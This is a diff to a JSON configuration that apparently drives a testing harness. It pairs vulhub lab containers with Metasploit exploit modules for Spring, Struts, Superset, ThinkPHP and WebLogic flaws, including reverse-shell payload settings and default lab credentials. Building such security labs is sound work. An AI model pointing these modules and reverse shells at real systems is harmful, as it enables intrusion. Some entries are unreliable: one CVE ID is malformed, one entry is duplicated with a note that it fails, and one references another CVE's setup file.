@@ -264,6 +264,83 @@
             "exploit": "multi/http/spring_cloud_function_spel_injection",
             "exploit_options":"set ForceExploit True;"
         }
+    },
+    {"name":"CVE-2022-22947",
+        "settings": {
+            "description":"Spring Cloud Gateway Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/spring/CVE-2022-22947/docker-compose.yml",
+            "target_name":"setc-spring-1",
+            "exploit": "linux/http/spring_cloud_gateway_rce",
+            "exploit_options":"set RPORT 8080; set payload cmd/unix/reverse_bash; set ForceExploit true;"
+        }
+    },
+    {"name":"CVE-2017-563",
+        "settings": {
+            "description":"Apache Struts Jakarta Multipart Parser OGNL Injection",
+            "yml_file":"$VULN_PATH/vulhub/struts2/s2-046/docker-compose.yml",
+            "target_name":"setc-struts2-1",
+            "exploit": "multi/http/struts2_content_type_ognl"
+        }
+    },
+    {"name":"CVE-2016-3081",
+        "settings": {
+            "description":"Apache Struts Dynamic Method Invocation Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/struts2/s2-032/docker-compose.yml",
+            "target_name":"setc-struts2-1",
+            "exploit": "multi/http/struts_dmi_exec"
+        }
+    },
+    {"name":"CVE-2023-37941",
+        "settings": {
+            "description":"Apache Superset Signed Cookie RCE",
+            "yml_file":"$VULN_PATH/vulhub/superset/CVE-2023-37941/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "linux/http/apache_superset_cookie_sig_rce",
+            "exploit_options":"set username admin; set password vulhub;"
+        }
+    },
+    {"name":"CVE-2019-9082",
+        "settings": {
+            "description":"ThinkPHP Multiple PHP Injection RCE",
+            "yml_file":"$VULN_PATH/vulhub/thinkphp/5-rce/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "unix/webapp/thinkphp_rce",
+            "exploit_options":"set rport 80;"
+        }
+    },
+    {"name":"CVE-2019-9082",
+        "settings": {
+            "description":"ThinkPHP Multiple PHP Injection RCE - TODO: doesnt work for some reason",
+            "yml_file":"$VULN_PATH/vulhub/thinkphp/5-rce/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "unix/webapp/thinkphp_rce",
+            "exploit_options":"set RPORT 80;"
+        }
+    },
+    {"name":"CVE-2023-21839",
+        "settings": {
+            "description":"Oracle Weblogic PreAuth Remote Command Execution via ForeignOpaqueReference IIOP Deserialization",
+            "yml_file":"$VULN_PATH/vulhub/weblogic/CVE-2023-21839/docker-compose.yml",
+            "target_name":"setc-weblogic-1",
+            "exploit": "multi/iiop/cve_2023_21839_weblogic_rce",
+            "exploit_options":"set HTTP_SRVPORT 7001; set RPORT 7001; set SRVHOST eth0; set AutoCheck false;"
+        }
+    },
+    {"name":"CVE-2020-14882",
+        "settings": {
+            "description":"Oracle WebLogic Server Administration Console Handle RCE",
+            "yml_file":"$VULN_PATH/vulhub/weblogic/CVE-2020-14882/docker-compose.yml",
+            "target_name":"setc-weblogic-1",
+            "exploit": "multi/http/weblogic_admin_handle_rce",
+            "exploit_options":"set target Linux Dropper; set payload linux/x86/meterpreter/reverse_tcp;"
+        }
+    },
+    {"name":"CVE-2019-2725",
+        "settings": {
+            "description":"Oracle Weblogic Server Deserialization RCE",
+            "yml_file":"$VULN_PATH/vulhub/weblogic/CVE-2018-2628/docker-compose.yml",
+            "target_name":"setc-weblogic-1",
+            "exploit": "multi/misc/weblogic_deserialize_asyncresponseservice"
+        }
     }
-
 ]
